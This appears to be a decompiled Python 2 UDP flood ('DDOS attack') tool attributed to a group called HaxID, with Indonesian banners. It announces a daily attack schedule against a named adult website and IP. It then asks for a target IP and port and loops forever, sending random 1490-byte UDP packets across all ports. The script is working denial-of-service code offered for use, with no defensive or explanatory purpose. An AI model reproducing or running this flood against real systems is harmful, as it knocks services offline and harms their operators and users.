
# Decompiled by HTR-TECH | TAHMID RAYAT
# Github : https://github.com/htr-tech
#---------------------------------------
# Source File : ddos.py
# Time : Sat Aug 22 08:01:18 2020
#---------------------------------------
# uncompyle6 version 3.7.3
# Python bytecode 2.7
# Decompiled from: Python 2.7.16 (default, Oct 10 2019, 22:02:15) 
# [GCC 8.3.0]
# Embedded file name: <seni>
import sys, os, time, socket, random, enlighten, time, sys
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year
import platform, os

def tampil(x):
    w = {'m': 31, 'h': 32, 'k': 33, 'b': 34, 'p': 35, 'c': 36}
    for i in w:
        x = x.replace('\r%s' % i, '\x1b[%s;1m' % w[i])

    x += '\x1b[0m'
    x = x.replace('\r0', '\x1b[0m')
    print x


def mengetik(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(random.random() * 0.1)


sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
os.system('clear')
mengetik('\x1b[31;1m<|\x1b[32;1m-----#~\x1b[36;1m$ \x1b[32;1mSelamat datang di tool DDOS attack by \x1b[36;1mHaxID \x1b[32;1msilahkan pergunakan dengan bijak\x1b[34;1m*')
print
time.sleep(1)
mengetik('\x1b[31;1m<|\x1b[32;1m-----#~\x1b[36;1m$ \x1b[36;1mJadwal DDOS attack Team \x1b[94mHaxID \x1b[36;1msetiap Hari jam \x1b[31;1m21:00 \x1b[36;1mdengan :')
print
time.sleep(2)
mengetik('\x1b[31;1m<|\x1b[32;1m-----#~\x1b[36;1m$ \x1b[95mTarget : \x1b[31;1mwww.xnxx.com \x1b[32;1m(\x1b[31;1m114.121.254.4 {80}\x1b[32;1m)')
time.sleep(1)
print
toolbar_width = 50
sys.stdout.write('[%s]' % ('-' * toolbar_width))
sys.stdout.flush()
for i in range(toolbar_width):
    sys.stdout.write('\r')
    sys.stdout.flush()
    sys.stdout.write('[')
    sys.stdout.write('#' * (i + 1))
    sys.stdout.flush()
    time.sleep(0.1)

time.sleep(2)
os.system('clear')
print '\x1b[94m_     _ \x1b[91m       \x1b[95m.-.     oo\x1b[92m_    '
print '\x1b[94m  /||_  \x1b[91m/||_   \x1b[95m c(O_O)c  \x1b[92m/  _)-< '
print "\x1b[94m/o_)  /o\x1b[91m_)  ,'.\x1b[95m---.`, \\__\x1b[92m `.  "
print '\x1b[94m  / |(\\ \x1b[91m/ |(\\ /\x1b[95m /|_|_|\\ /\x1b[92m   `. | '
print '\x1b[94m  | | ))\x1b[91m| | ))|\x1b[95m \\_____/ |\x1b[92m   _| | '
print "\x1b[94m  | |// \x1b[91m| |// '\x1b[95m. `---' .`\x1b[92m,-'   | "
print "\x1b[94m  \\__/  \x1b[91m\\__/   \x1b[95m `-...-' (\x1b[92m_..--'  "
print '                                \x1b[95m.-. \x1b[91m.-. \x1b[92m.-. \x1b[94m.-. \x1b[95m.-. \x1b[36;1m. . '
print '                                \x1b[95m|-| \x1b[91m |  \x1b[92m |  \x1b[94m|-| \x1b[95m|   \x1b[36;1m|<  '
print "                                \x1b[95m` ' \x1b[91m '  \x1b[92m '  \x1b[94m` ' \x1b[95m`-' \x1b[36;1m' ` "
print
print '\x1b[94m===================== \x1b[91m====================='
print
print '\x1b[92mAuthor   : \x1b[36;1mAsecC|~|eror404'
print '\x1b[92mTeam     : \x1b[36;1mHaxID'
print '\x1b[92mgithub   : \x1b[36;1mhttps://github.com/muhammadfathul'
print '\x1b[92mFacebook : \x1b[36;1mhttps://www.facebook.com/komaro.bae'
print
print '\x1b[92m===================== \x1b[95m====================='
print
ip = raw_input('\x1b[34;1m<|\x1b[91m-----#~\x1b[32;1m$ \x1b[36;1mIP Target : ')
port = input('\x1b[34;1m<|\x1b[91m-----#~\x1b[32;1m$ \x1b[36;1mPort      : ')
os.system('clear')
manager = enlighten.Manager()
pbar = manager.counter(total=100)
for num in range(1, 101):
    time.sleep(0.1)
    print '\x1b[94mPersiapan \x1b[91m%d \x1b[92mMenyerang' % num
    print ip
    pbar.update()

time.sleep(3)
os.system('clear')
print '\x1b[31;1mAttacking.......\x1b[95m*\x1b[32;1m'
print ip
time.sleep(5)
sent = 0
while True:
    sock.sendto(bytes, (ip, port))
    sent = sent + 1
    port = port + 1
    print '\x1b[32;1mMengirim \x1b[31;1m%s \x1b[34;1mpaket ke \x1b[31;1m%s \x1b[36;1mLewat port\x1b[31;1m:%s' % (sent, ip, port)
    if port == 65534:
        port = 1